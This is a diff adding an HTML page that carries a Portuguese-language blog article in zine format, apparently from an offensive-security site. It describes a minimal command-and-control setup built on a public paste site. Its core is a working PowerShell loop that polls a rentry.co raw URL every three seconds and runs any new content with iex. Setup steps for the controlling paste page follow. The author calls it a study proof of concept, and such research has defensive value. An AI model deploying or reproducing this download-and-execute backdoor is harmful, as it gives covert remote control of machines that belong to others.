@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>My Little Power Comand and Control - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     MY LITTLE POWER COMAND AND CONTROL
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : My Little Power Comand and Control
+        autor  : offensive think
+        data   : Wed, Mar 30, 2022
+        tags   : #powershell
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/my-little-c2.html &lt;--
+
+---[ INDEX ]------------------------------------------------------------
+0 - A Ideia
+1 - O Powershell
+2 - O Site controlador
+3 - Talk is Cheap, Show me the Execution!
+4 - Possibilidades!
+
+
+
+
+---[ 0x00 - A IDEIA ]---------------------------------------------------
+Usar sites públicos sem fins maliciosos que hospedam pequenos pedaços de texto, como dontpad.com, etc. , para passar comandos para um powershell, também “não malicioso” gentilmente hospedado em um servidor/estação.
+
+
+---[ 0x01 - O POWERSHELL ]----------------------------------------------
+Esse código não sofreu nenhuma otimização , ofuscamento ou qualquer coisa do tipo, por se tratar apenas de uma prova de conceito para estudos.
+
+    $urlc2=&quot;https://rentry.co/XXXXX/raw&quot; # URL personalizada. XXXXX = Identificador único
+    $c0=&quot;&quot;
+    while(1){
+        $c1=(New-Object Net.WebClient).DownloadString($urlc2)
+        if( $c1 -ne $c0 ) {
+             iex $c1
+             $c0=$c1
+        }
+        sleep(3) # Timer, apenas para não ficar consumindo recursos o tempo todo!
+    }
+
+
+
+---[ 0x02 - O SITE CONTROLADOR ]----------------------------------------
+Utilizamos o https://rentry.co (https://rentry.co/)
+Acesse o site, digite o código powershell que deseja executar no server (Ex.: Get-Process) , clique em *GO*
+</pre>
+<a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F16ac7d0f-7b81-484a-acba-c2b5358d40f0%2FUntitled.png?width=500&amp;table=block&amp;id=41d5f141-84a4-4019-8d72-01aa674261e5" target="_blank"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F16ac7d0f-7b81-484a-acba-c2b5358d40f0%2FUntitled.png?width=500&amp;table=block&amp;id=41d5f141-84a4-4019-8d72-01aa674261e5"  ></a>
+<pre>
+Na tela seguinte anote o seu código de edição, você precisará para trocar os comandos: Your Edit Code e a sua URL. Essa URL, deverá ser colocada na variável $urlc2 adicionando a string /raw no powershell script acima.
+</pre>
+<a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F598db4d1-dbb1-4a99-b89b-8950e385852c%2FUntitled.png?width=400&amp;table=block&amp;id=4cdc2a2c-0b1a-4e9f-a530-47f48cbc3da7" target="_blank"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F598db4d1-dbb1-4a99-b89b-8950e385852c%2FUntitled.png?width=400&amp;table=block&amp;id=4cdc2a2c-0b1a-4e9f-a530-47f48cbc3da7"  ></a>
+<pre>
+
+
+---[ 0x03 - TALK IS CHEAP, SHOW ME THE EXECUTION! ]---------------------
+[embed] https://www.youtube.com/embed/tW-yMnT9Hvw?feature=oembed
+
+
+---[ 0x04 - POSSIBILIDADES! ]-------------------------------------------
+Muitas. ;D
+É só uma prova de conceito e como tal é usada apenas para fins de estudo e verificar as possibilidades de execução de comandos em uma máquina terceira, neste caso, “cegamente”, já que o controlador não tem o retorno do comando. Mas isso dá pra implementar facilmente.  Talvez eu mostre a implementação que fiz na segunda parte ;D
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
